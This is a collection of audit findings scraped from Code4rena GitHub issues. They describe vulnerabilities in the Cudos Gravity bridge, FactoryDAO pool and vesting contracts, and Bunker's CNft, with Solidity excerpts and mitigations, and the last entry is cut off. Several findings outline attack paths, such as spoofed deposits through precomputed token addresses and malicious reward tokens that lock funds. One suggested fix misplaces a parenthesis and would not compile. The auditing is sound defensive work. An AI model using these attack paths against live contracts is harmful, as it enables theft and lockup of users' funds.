[{"title": "The Gravity.sol should have pause/unpause functionality", "html_url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/139", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cudos-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L175   # Vulnerability details  ## Impact  In case a hack is occuring or an exploit is discovered, the team (or validators in this case) should be able to pause functionality until the necessary changes are made to the system. Additionally, the gravity.sol contract should be manged by proxy so that upgrades can be made by the validators.  Because an attack would probably span a number of blocks, a method for pausing the contract would be able to interrupt any such attack if discovered.  To use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before the system transferred funds to the hacker. However, they were not able to shut the system down fast enough. (According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)   ## Proof of Concept  https://github.com/code-423n4/2022-05-cudos/blob/main/solidity/contracts/Gravity.sol#L175  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Pause functionality on the contract would have helped secure the funds quickly.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/59", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-cudos-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L595-L630   # Vulnerability details  ## Impact  Smart contracts addresses made using the `create` opcode are deterministic based off the deployer account and the nonce of this account.   An attacker is therefore able to predetermine the address of any smart contracts deployed using `deployERC20()`.  One of the limitations of  OpenZeppelin's `token.safeTransferFrom(from, to, amount)` is that it will succeed if there is no bytecode at the `token` address.  The impact of both of these features is that an attacker may call `sendToCosmos(_tokenContract, _destination, _amount)` for an ERC20 token before it is deployed using `deployERC20()` since the address can be calculated. The attacker may set any arbitrary amount and the `IERC20(_tokenContract).safeTransferFrom(msg.sender, address(this), _amount);` will succeed. The `SendToCosmosEvent` will be emitted and the relevant transfer will occur on the other side of the bridge.   ## Proof of Concept  `IERC20(_tokenContract).safeTransferFrom(msg.sender, address(this), _amount);` succeeds if `_tokenContract` does not have any bytecode. So the attacker may call `sendToCosmos()`.  Following this the attacker calls `deployERC20()` to deploy the token contract. Note the token contract was precalculated and used as the `_tokenContract` parameter in `sendToCosmos()`.  The bridge will then process `SendToCosmosEvent` on the Cosmos chain.  ```solidity  function sendToCosmos(   address _tokenContract,   bytes32 _destination,   uint256 _amount  ) public nonReentrant  {   IERC20(_tokenContract).safeTransferFrom(msg.sender, address(this), _amount);   state_lastEventNonce = state_lastEventNonce.add(1);   emit SendToCosmosEvent(    _tokenContract,    msg.sender,    _destination,    _amount,    state_lastEventNonce   );  }   function deployERC20(   string memory _cosmosDenom,   string memory _name,   string memory _symbol,   uint8 _decimals  ) public {   // Deploy an ERC20 with entire supply granted to Gravity.sol   CosmosERC20 erc20 = new CosmosERC20(address(this), _name, _symbol, _decimals);    // Fire an event to let the Cosmos module know   state_lastEventNonce = state_lastEventNonce.add(1);   emit ERC20DeployedEvent(    _cosmosDenom,    address(erc20),    _name,    _symbol,    _decimals,    state_lastEventNonce   );  } ```  ## Recommended Mitigation Steps  This issue may be resolved by enforcing `sendToCosmos()` check that `_tokenContract` contains bytecode.  ```solidity  function isContract(address _addr) private returns (bool isContract){      uint32 size;      assembly {          size := extcodesize(_addr)      }       return (size > 0);  }   function sendToCosmos(   address _tokenContract,   bytes32 _destination,   uint256 _amount  ) public nonReentrant  {   require(isContract(_tokenContract, \"Invalid contract address\"));   IERC20(_tokenContract).safeTransferFrom(msg.sender, address(this), _amount);                 ...         } ```  "}, {"title": "Non-Cudos Erc20 funds sent through sendToCosmos() will be lost.", "html_url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/58", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cudos-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L595-L609   # Vulnerability details  ## Impact  No checks for non-Cudos tokens mean that non-Cudos ERC20 tokens will be lost to the contract, with the user not having any chance of retrieving them.  However, the admin can retrieve them through withdrawERC20.  Impact is that users lose their funds, but admins gain them.  The mistakes could be mitigated on the contract, by checking against a list of supported tokens, so that users don't get the bad experience of losing funds and CUDOS doesn't have to manually refund users  ## Proof of Concept  User sends 100 ETH through sendToCosmos, hoping to retrieve 100 synthetic ETH on Cudos chain but finds that funds never appear.   ```   function sendToCosmos(   address _tokenContract,   bytes32 _destination,   uint256 _amount  ) public nonReentrant  {   IERC20(_tokenContract).safeTransferFrom(msg.sender, address(this), _amount);   state_lastEventNonce = state_lastEventNonce.add(1);   emit SendToCosmosEvent(    _tokenContract,    msg.sender,    _destination,    _amount,    state_lastEventNonce   );  }  ```  https://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L595-L609  Admin can retrieve these funds should they wish, but user never gets them back because the contract does not check whether the token is supported.  ```   function withdrawERC20(   address _tokenAddress)    external {   require(cudosAccessControls.hasAdminRole(msg.sender), \"Recipient is not an admin\");   uint256 totalBalance = IERC20(_tokenAddress).balanceOf(address(this));   IERC20(_tokenAddress).safeTransfer(msg.sender , totalBalance);  }   ```     https://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L632-L638  ## Tools Used Logic and discussion with @germanimp  ## Recommended Mitigation Steps  Add checks in sendToCosmos to check the incoming tokenAddress against a supported token list, so that user funds don't get lost and admin don't need to bother refunding.  "}, {"title": "getRewards() in PermissionlessBasicPoolFactory calculate wrong reward amount for receiptId==0", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/161", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L156-L173   # Vulnerability details  ## Impact In `getRewards()` of `PermissionlessBasicPoolFactory` contract, there is a check to see that receipt is initialized receipt, but the condition used by code will be true for `receiptId` equal `0`. because `receiptId==0` is not initilized for any pool and the value of `pools[poolId].receipts[0].id` will be `0` so the condition `receipt.id == receiptId` will be passed on `getRewards()`. Any function that depends on `getRewards()` to check that if `receptId` has deposited fund, can be fooled. right now this bug has no direct money loss, but this function doesn't work as it suppose too.  ## Proof of Concept This is `getRewards()` code: ```     function getRewards(uint poolId, uint receiptId) public view returns (uint[] memory) {         Pool storage pool = pools[poolId];         Receipt memory receipt = pool.receipts[receiptId];         require(pool.id == poolId, 'Uninitialized pool');         require(receipt.id == receiptId, 'Uninitialized receipt');         uint nowish = block.timestamp;         if (nowish > pool.endTime) {             nowish = pool.endTime;         }          uint secondsDiff = nowish - receipt.timeDeposited;         uint[] memory rewardsLocal = new uint[](pool.rewardsWeiPerSecondPerToken.length);         for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {             rewardsLocal[i] = (secondsDiff * pool.rewardsWeiPerSecondPerToken[i] * receipt.amountDepositedWei) / 1e18;         }         return rewardsLocal;     } ``` if the value of `receiptId` set as `0` then even so `receiptId==0` is not initialized but this line: ```         require(receipt.id == receiptId, 'Uninitialized receipt'); ``` will be passed, because, receipts start from number `1` and `pool.receipts[0]` will have zero value for his fields. This is the code in `deposit()` which is responsible for creating receipt objects. ```         pool.totalDepositsWei += amount;         pool.numReceipts++;          Receipt storage receipt = pool.receipts[pool.numReceipts];         receipt.id = pool.numReceipts;         receipt.amountDepositedWei = amount;         receipt.timeDeposited = block.timestamp;         receipt.owner = msg.sender; ``` as you can see `pool.numReceipts++` and `pool.receipts[pool.numReceipts]` increase `numReceipts` and use it as receipts index. so receipnts will start from index `1`. This bug will cause that `getRewards(poolId, 0)` return `0` instead of reverting. any function that depend on reverting of `getRewards()` for uninitialized receipts can be excploited by sending `receipntId` as `0`. this function can be inside this contract or other contracts. (`withdraw` use `getRewards` and we will see that we can create `WithdrawalOccurred` event for `receiptsId` as 0)  ## Tools Used VIM  ## Recommended Mitigation Steps If you want to start from index `1` then add this line too to ensure `receipntId` is not `0` too: ``` require(receiptId > 0, 'Uninitialized receipt'); ``` or we could check for uninitialized receipnts with `owner` field as non-zero.   "}, {"title": "Verification should be leafed based and not address based", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/148", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleVesting.sol#L115 https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L92   # Vulnerability details  ## Impact Contracts should clarify what is the intended behavior for Merkle trees with multiple leafs with the same address.   ## Recommended Mitigation Steps  There is 2 possible behaviors:   - either - what is currently done - you only authorize one claim per address, in which case the multiple leaf are here to give users a choice - for example you could use `MerkleVesting` to give users the choice between 2 sets of vesting parameters and have something close to `MerkleResistor`.  - either you use a mapping based on the leaf to store if a leaf has been claimed or not.    This behavior should be clarified in the comments at least, and made clear to merkle tree builders.  "}, {"title": "Pool owners can prevent withdrawals of specific receipts", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/125", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L234   # Vulnerability details  ## Impact Pool owners can prevent withdrawals of specific receipts without impacting any other functionality  ## Proof of Concept Reciepts are non-transferrable, so a malicious owner can monitor the blockchain for receipt creations, and inspect which account holds the receiptId. Next, by changing settings in a custom reward token that reverts for specific addresses, the owner can prevent that specific receipt owner from withdrawing: ```solidity File: contracts/PermissionlessBasicPoolFactory.sol   #1  230               success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount); 231           } 232    233           success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei); 234           require(success, 'Token transfer failed'); ``` https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L230-L234  While the sponsor mentions that malicious tokens make the pool malicious, this particular issue has a straight forward fix outlined below in the mitigation section  ## Tools Used Code inspection  ## Recommended Mitigation Steps Rather than reverting the whole withdrawal if only one transfer fails, return a boolean of whether all withdrawals were successful, and allow `withdraw()` to be called multiple times, keeping track of what has been transferred and what hasn't   "}, {"title": "Pool owners can prevent the payment of taxes", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/124", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L258-L272   # Vulnerability details  ## Impact Pool owners can prevent taxes from being paid without impacting any other functionality  ## Proof of Concept By adding a custom reward token that always reverts for transfers to `globalBenericiary`, the owner can prevent taxes from being paid: ```solidity File: contracts/PermissionlessBasicPoolFactory.sol   #1  258       /// @notice Withdraw taxes from pool 259       /// @dev Anyone may call this, it just moves the taxes from this contract to the globalBeneficiary 260       /// @param poolId which pool are we talking about? 261       function withdrawTaxes(uint poolId) external { 262           Pool storage pool = pools[poolId]; 263           require(pool.id == poolId, 'Uninitialized pool'); 264    265           bool success = true; 266           for (uint i = 0; i < pool.rewardTokens.length; i++) { 267               uint tax = taxes[poolId][i]; 268               taxes[poolId][i] = 0; 269               success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax); 270           } 271           require(success, 'Token transfer failed'); 272       } ``` https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L258-L272  While the sponsor mentions that malicious tokens make the pool malicious, this particular issue has a simple fix outlined below in the mitigation section  ## Tools Used Code inspection  ## Recommended Mitigation Steps Force taxes to be paid during `withdraw()`   "}, {"title": "Unbounded loop in `withdraw()` may cause rewards to be locked in the contract", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/122", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231   # Vulnerability details  ## Impact The `withdraw()` has an unbounded loop with external calls. If the gas costs of functions change between when deposits are made and when rewards are withdrawn, or if the gas cost of the deposit (`transferFrom()`) is less than the gas cost of the withdrawal (`transfer()`), then the `withdraw()` function may revert due to exceeding the block size gas limit.  ## Proof of Concept `transfer()` is an external call, and `rewards.length` has no maximum size: ```solidity File: contracts/PermissionlessBasicPoolFactory.sol   #1  224           for (uint i = 0; i < rewards.length; i++) { 225               pool.rewardsWeiClaimed[i] += rewards[i]; 226               pool.rewardFunding[i] -= rewards[i]; 227               uint tax = (pool.taxPerCapita * rewards[i]) / 1000; 228               uint transferAmount = rewards[i] - tax; 229               taxes[poolId][i] += tax; 230               success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount); 231           } ``` https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L231  ## Tools Used Code inspection  ## Recommended Mitigation Steps Allow the specification of an offset and length to the `withdraw()` function, so that withdrawals can be broken up into smaller batches if required   "}, {"title": "MerkleResistor: zero coinsPerSecond will brick tranche initialization and withdrawals", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L259 https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L264   # Vulnerability details  ## Details & Impact  It is possible for `coinsPerSecond` to be zero. In these cases, the `startTime` calculation   ```solidity uint startTime = block.timestamp + vestingTime - (totalCoins / coinsPerSecond); ```  will revert from division by zero, preventing initialization, and by extension, withdrawals of vested tokens.  ## Proof of Concept  We assume vesting time chosen is the maximum (`tree.maxEndTime`) so that `totalCoins = maxTotalPayments`. These examples showcase some possibilities for which the calculated `coinsPerSecond` can be zero.  ### Example 1: High upfront percentage  - `pctUpFront = 99` (99% up front) - `totalCoins = 10_000e6` (10k USDC) - `vestingTime = 1 year`  ```solidity uint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) / (vestingTime * 100); // 10_000e6 * (100 - 99) / (365 * 86400 * 100) // = 0 ```  ### Example 2: Small reward amount / token decimals  - `pctUpFront = 0` - `totalCoins = 100_000e2` (100k EURS) - `vestingTime = 180 days`  ```solidity uint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) / (vestingTime * 100); // 100_000e2 * 100 / (180 * 86400 * 100) // = 0 ```  ## Recommended Mitigation Steps  Scale up `coinsPerSecond` by `PRECISION`, then scale down when executing withdrawals. While it isn\u2019t foolproof, the possibility of `coinsPerSecond` being zero is reduced significantly.  ```solidity // L264 uint coinsPerSecond = (totalCoins * (uint(100) - tree.pctUpFront)) * PRECISION / (vestingTime * 100);  // L184 currentWithdrawal = (block.timestamp - tranche.lastWithdrawalTime) * tranche.coinsPerSecond / PRECISION; ```  "}, {"title": "DoS: Blacklisted user may prevent `withdrawExcessRewards()`", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/57", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L242-L256 https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L234   # Vulnerability details  ## Impact  If one user becomes blacklisted or otherwise cannot be transferred funds in any of the rewards tokens or the deposit token then they will not be able to call `withdraw()` for that token.  The impact of one user not being able to call `withdraw()` is that the owner will now never be able to call `withdrawExcessRewards()` and therefore lock not only the users rewards and deposit but also and excess rewards attributed to the owner.  Thus, one malicious user may deliberately get them selves blacklisted to prevent the owner from claiming the final rewards. Since the attacker may do this with negligible balance in their `deposit()` this attack is very cheap.  ## Proof of Concept  It is possible for `IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);` to fail for numerous reasons. Such as if a user has been blacklisted (in certain ERC20 tokens) or if a token is paused or there is an attack and the token is stuck.  This will prevent `withdraw()` from being called.  ```solidity         for (uint i = 0; i < rewards.length; i++) {             pool.rewardsWeiClaimed[i] += rewards[i];             pool.rewardFunding[i] -= rewards[i];             uint tax = (pool.taxPerCapita * rewards[i]) / 1000;             uint transferAmount = rewards[i] - tax;             taxes[poolId][i] += tax;             success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);         }          success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);         require(success, 'Token transfer failed'); ```  Since line 245 of `withdrawExcessRewards()` requires that `require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');`, if one single user is unable to withdraw then it is impossible for the owner to claim the excess rewards and they are forever stuck in the contract.  ## Recommended Mitigation Steps  Consider allowing `withdrawExcessRewards()` to be called after a set period of time after the pool end if most users have withdrawn or some similar criteria.  "}, {"title": "DoS: Attacker may significantly increase the cost of `withdrawExcessRewards()` by creating a significant number of excess receipts", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/54", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L245   # Vulnerability details  ## Impact  An attacker may cause a DoS attack on `withdrawExcessRewards()` by creating a excessive number of `receipts` with minimal value. Each of these receipts will need to be withdrawn before the owner can call `withdrawExcessRewards()`.   The impact is the owner would have to pay an unbounded amount of gas to `withdraw()` all the accounts and receive their excess funds.  ## Proof of Concept  `withdrawExcessRewards()` has the requirement that `totalDepositsWei` for the pool is zero before the owner may call this function as seen on line 245.  ```solidity         require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn'); ```  `pool.totalDepositsWei` is added to each time a user calls `deposit()`. It is increased by the amount the user deposits. There are no restrictions on the amount that may be deposited as a result a user may add 1 wei (or the smallest unit on any currency) which has negligible value.  The owner can force withdraw these accounts by calling `withdraw()` so long as `block.timestamp > pool.endTime`. They would be required to do this for each account that was created.  This could be a significant amount of gas costs, especially if the gas price has increased since the attacker originally made the deposits.  ## Recommended Mitigation Steps  Consider adding a minimum deposit amount for each pool that can be configured by the pool owner.  Alternatively, allow the owner to call `withdrawExcessRewards()` given some other criteria such as  - A fix period of time (e.g. 1 month) has passed since the end of the auction; and - 90% of the deposits have been withdrawn These criteria can be customised as desired by the design team.  "}, {"title": "Owner of a pool may prevent any taxes being withdrawn", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/52", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L261-L272   # Vulnerability details  ## Impact  It is possible for the owner of a pool to prevent any taxes being withdrawn by the `globalBeneficiary`. The impact is the taxed tokens will be permanently locked in the contract and `withdrawTaxes()` will not be callable for that `poolId`.   ## Proof of Concept  The attack works by setting one of the `rewardTokenAddresses` to a malicious contract during `addPool()`. The malicious contract is set such that it will revert on the call `pool.rewardTokens[i]).transfer(globalBeneficiary, tax)` if an only if the `to` address is `globalBeneficiary.  The result of this attack is that if one reward transfer fails then entire `withdrawTaxes()` transaction will revert and no taxes can be claimed. However, the pool will function correctly for all other users.  ```solidity     function withdrawTaxes(uint poolId) external {         Pool storage pool = pools[poolId];         require(pool.id == poolId, 'Uninitialized pool');           bool success = true;         for (uint i = 0; i < pool.rewardTokens.length; i++) {             uint tax = taxes[poolId][i];             taxes[poolId][i] = 0;             success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);         }         require(success, 'Token transfer failed');     } ```  ## Recommended Mitigation Steps  There are a few mitigations to this issue.  The first is for the `withdrawTaxes()` function to take both `poolId` and `rewardIndex` as a parameters to allowing the tax beneficiary to only withdraw from certain reward tokens in the pool. This would allow the beneficiary to withdraw from all reward tokens except malicious ones.  The second mitigation is to implement a `try-catch` condition around the withdrawal of reward tokens. In the catch statement re-instate the `taxes[poolId][i] = tax` if the transfer fails. Alternatively just skip the reward tokens if the transfer fails though this would be undesirable if a token is paused for some reason.  "}, {"title": "SpeedBumpPriceGate: Excess ether did not return to the user", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/48", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L65-L82   # Vulnerability details  ## Impact The passThruGate function of the SpeedBumpPriceGate contract is used to charge NFT purchase fees. Since the price of NFT will change due to the previous purchase, users are likely to send more ether than the actual purchase price in order to ensure that they can purchase NFT. However, the passThruGate function did not return the excess ether, which would cause asset loss to the user. Consider the following scenario:  1. An NFT is sold for 0.15 eth 2. User A believes that the value of the NFT is acceptable within 0.3 eth, considering that someone may buy the NFT before him, so user A transfers 0.3 eth to buy the NFT 3. When user A's transaction is executed, the price of the NFT is 0.15 eth, but since the contract does not return excess eth, user A actually spends 0.3 eth. ## Proof of Concept https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L65-L82 ## Tools Used None ## Recommended Mitigation Steps ``` -   function passThruGate(uint index, address) override external payable { +  function passThruGate(uint index, address payer) override external payable {         uint price = getCost(index);         require(msg.value >= price, 'Please send more ETH');          // bump up the price         Gate storage gate = gates[index];         // multiply by the price increase factor         gate.lastPrice = (price * gate.priceIncreaseFactor) / gate.priceIncreaseDenominator;         // move up the reference         gate.lastPurchaseBlock = block.number;          // pass thru the ether         if (msg.value > 0) {             // use .call so we can send to contracts, for example gnosis safe, re-entrance is not a threat here -           (bool sent, bytes memory data) = gate.beneficiary.call{value: msg.value}(\"\"); +          (bool sent, bytes memory data) = gate.beneficiary.call{value: price}(\"\");             require(sent, 'ETH transfer failed');         } +      if (msg.value - price > 0){  +         (bool sent, bytes memory data) = payer.call{value: msg.value - price}(\"\"); +          require(sent, 'ETH transfer failed');}     } ```  "}, {"title": "ERC20 tokens with different decimals than 18 leads to loss of funds", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/47", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L169 https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L282   # Vulnerability details  ## Impact Contract `PermissionlessBasicPoolFactory` calculates rewards by using hardcoded value of decimals `18` (1e18) for ERC20 tokens. This leads to wrong rewards calculations and effectively loss of funds for all pools that will be using ERC20 tokens with different decimals than `18`. Example of such a token is USDC that has 6 decimals only.  ## Proof of Concept * https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L169 * https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L282  ## Tools Used Manual Review / VSCode  ## Recommended Mitigation Steps It is recommended to add support for different number of decimals than `18` by dynamically checking `decimals()` for the tokens that are part of the rewards calculations. Alternatively if such a support is not needed, new require statements should be added to `addPool` that will be checking that the number of decimals for all ERC20 tokens is `18`.  "}, {"title": "amount requires to be updated to contract balance increase (1)", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/34", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L137-L149   # Vulnerability details  ## Impact Every time transferFrom or transfer function in ERC20 standard is called there is a possibility that underlying smart contract did not transfer the exact amount entered. It is required to find out contract balance increase/decrease after the transfer. This pattern also prevents from re-entrancy attack vector.  ## Proof of Concept  ## Tools Used  ## Recommended Mitigation Steps Recommended code: ```solidity function fundPool(uint poolId) internal {     Pool storage pool = pools[poolId];     bool success = true;     uint amount;     for (uint i = 0; i < pool.rewardFunding.length; i++) {         amount = getMaximumRewards(poolId, i);         // transfer the tokens from pool-creator to this contract           uint256 balanceBefore = IERC20(pool.rewardTokens[i]).balanceOf(address(this)); // remembering asset balance before the transfer         IERC20(pool.rewardTokens[i]).safeTransferFrom(msg.sender, address(this), amount);         uint256 newAmount = IERC20(pool.rewardTokens[i]).balanceOf(address(this)) - balanceBefore; // updating actual amount to the contract balance increase         success = success && newAmount == amount; // making sure amounts match          // bookkeeping to make sure pools don't share tokens         pool.rewardFunding[i] += amount;     }     require(success, 'Token deposits failed'); } ```  "}, {"title": "safeTransferFrom is recommended instead of transfer (1)", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/22", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L144   # Vulnerability details  ## Impact  ERC20 standard allows transferF function of some contracts to return bool or return nothing. Some tokens such as USDT return nothing. This could lead to funds stuck in the contract without possibility to retrieve them. Using safeTransferFrom of SafeERC20.sol is recommended instead.  ## Proof of Concept  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/token/ERC20/utils/SafeERC20.sol  ## Tools Used   ## Recommended Mitigation Steps  "}, {"title": "Malicious token reward could disable withdrawals", "html_url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/20", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-factorydao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L230   # Vulnerability details  ## Impact `PermissionlessBasicPoolFactory.withdraw` requires each reward token transfers to succeed before withdrawing the deposit. If one of the reward token is a malicious/pausable contract that reverts on transfer, unaware users that deposited into this pool will have their funds stuck in the contract.   ## Recommended Mitigation Steps Add an `emergencyWithdraw` function that ignores failed reward token transfers.  "}, {"title": "CNft.sol - revert inside safeTransferFrom will break composability & standard behaviour", "html_url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/93", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-bunker-findings", "body": "# Lines of code  https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CNft.sol#L204   # Vulnerability details  The function safeTransferFrom is a standard interface in ERC1155, and its expected to succeed if all the parametes are valid, and revert on error, which is not the case here so its a deviation.  Refer to the EIP-1155 safeTransferFrom rules: > MUST revert if _to is the zero address. > MUST revert if balance of holder for token _id is lower than the _value sent to the recipient. > MUST revert on any other error.  There is no loss of assets, but the assets or tokens and CNft contract can be unusable by other protocols, and likelihood & impact of this issue is high.  ## Impact If other protocols want to integrate CNft, then in that case just for CNft Contract / tokens, they have to take exception and use safeBatchTransferFrom, instead of safeTransferFrom. If they dont take care of this exception, then their protocol functions will fail while using CNft, even if valid values are given.  ## Proof of Concept Contract : CNft.sol  Function : safeTransferFrom  > Line 204   revert(\"CNFT: Use safeBatchTransferFrom instead\");  ## Recommended Mitigation Steps Instead of revert, call function safeBatchTransferFrom with 1 item in the array, e.g., > safeBatchTransferFrom(from, to, [id], [amount], data)   "}, {"title": "`Comptroller#_initializeNftCollateral` Collateral Factor for new market may be larger than `collateralFactorMaxMantissa`, which can lead to bad debt", "html_url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/79", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-bunker-findings", "body": "# Lines of code  